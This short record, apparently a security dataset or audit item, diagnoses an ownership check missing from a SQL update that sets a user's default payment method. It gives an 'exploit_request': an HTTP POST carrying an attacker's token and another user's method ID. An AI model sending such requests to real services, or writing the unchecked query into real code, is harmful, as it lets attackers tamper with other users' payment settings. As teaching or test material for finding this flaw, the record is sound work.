diagnosis: Two raw SQL queries are used to set a default payment method. The first correctly scopes to the user, but the second updates a specific method by ID without verifying that the method actually belongs to the user.
exploit_request:
POST /api/payments/default HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer <attacker_token>

{"method_id": 999}
